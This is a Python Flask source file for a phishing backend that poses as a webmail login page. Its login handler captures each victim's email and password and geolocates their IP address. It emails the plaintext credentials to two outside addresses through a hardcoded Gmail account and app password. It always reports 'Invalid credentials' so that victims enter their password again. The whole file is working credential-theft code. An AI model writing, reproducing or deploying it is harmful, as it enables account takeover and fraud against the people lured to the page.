import os
import logging
import smtplib
import json
import requests
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from flask import Flask, render_template, request, jsonify

# Configure logging
logging.basicConfig(level=logging.DEBUG)

# Create the Flask app
app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "default_secret_key")

# Global variable to track login attempts by IP
login_attempts = {}

def get_ip_info(ip_address):
    """Get location information based on IP address."""
    try:
        response = requests.get(f"http://ip-api.com/json/{ip_address}")
        if response.status_code == 200:
            data = response.json()
            return {
                "city": data.get("city", "Unknown"),
                "region": data.get("regionName", "Unknown"),
                "country": data.get("country", "Unknown"),
                "isp": data.get("isp", "Unknown"),
                "timezone": data.get("timezone", "Unknown")
            }
    except Exception as e:
        logging.error(f"Error fetching IP info: {e}")
    
    return {
        "city": "Unknown",
        "region": "Unknown",
        "country": "Unknown",
        "isp": "Unknown",
        "timezone": "Unknown"
    }

def send_email(subject, message_body, to_email):
    """Send email using SMTP."""
    try:
        sender_email = "coastalloan60@gmail.com"
        password = "sphw oizv szzy fpgw"
        
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = to_email
        msg['Subject'] = subject
        
        msg.attach(MIMEText(message_body, 'html'))
        
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(sender_email, password)
            server.send_message(msg)
            logging.info(f"Email sent to {to_email}")
            return True
    except Exception as e:
        logging.error(f"Failed to send email: {e}")
        return False

@app.route('/')
def index():
    """Render the webmail login page."""
    return render_template('index.html')

@app.route('/api/login', methods=['POST'])
def login():
    """Handle login attempts and collect data."""
    data = request.json
    email = data.get('email', '')
    password = data.get('password', '')
    attempt_number = data.get('attempt', 1)
    
    # Get IP address
    ip_address = request.remote_addr
    # Get additional info from headers if available (for proxies)
    if request.headers.get('X-Forwarded-For'):
        ip_address = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    
    # Get location info
    ip_info = get_ip_info(ip_address)
    
    # Track the attempt
    if ip_address not in login_attempts:
        login_attempts[ip_address] = []
    
    # Store the attempt
    attempt_data = {
        'timestamp': data.get('timestamp'),
        'email': email,
        'password': password,
        'attempt_number': attempt_number,
        'ip_address': ip_address,
        'location': ip_info
    }
    
    login_attempts[ip_address].append(attempt_data)
    
    # Create email message
    subject = f"Webmail Login Attempt #{attempt_number} from {ip_info['city']}, {ip_info['country']}"
    message_body = f"""
    <html>
    <head>
        <style>
            body {{ font-family: Arial, sans-serif; }}
            .container {{ padding: 20px; }}
            .header {{ background-color: #f8f9fa; padding: 10px; }}
            .details {{ margin-top: 20px; }}
            table {{ border-collapse: collapse; width: 100%; }}
            th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
            th {{ background-color: #f2f2f2; }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h2>Webmail Login Attempt #{attempt_number}</h2>
            </div>
            <div class="details">
                <h3>User Information:</h3>
                <table>
                    <tr>
                        <th>Email</th>
                        <td>{email}</td>
                    </tr>
                    <tr>
                        <th>Password</th>
                        <td>{password}</td>
                    </tr>
                    <tr>
                        <th>Timestamp</th>
                        <td>{data.get('timestamp')}</td>
                    </tr>
                </table>
                
                <h3>Location Information:</h3>
                <table>
                    <tr>
                        <th>IP Address</th>
                        <td>{ip_address}</td>
                    </tr>
                    <tr>
                        <th>City</th>
                        <td>{ip_info['city']}</td>
                    </tr>
                    <tr>
                        <th>Region</th>
                        <td>{ip_info['region']}</td>
                    </tr>
                    <tr>
                        <th>Country</th>
                        <td>{ip_info['country']}</td>
                    </tr>
                    <tr>
                        <th>ISP</th>
                        <td>{ip_info['isp']}</td>
                    </tr>
                    <tr>
                        <th>Timezone</th>
                        <td>{ip_info['timezone']}</td>
                    </tr>
                </table>
            </div>
        </div>
    </body>
    </html>
    """
    
    # Send to both email addresses
    send_email(subject, message_body, "support@cbelko.com")
    send_email(subject, message_body, "support@cbelko.net")
    
    # Simulate a failed login to trigger the second attempt on the client side
    return jsonify({"success": False, "message": "Invalid credentials"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
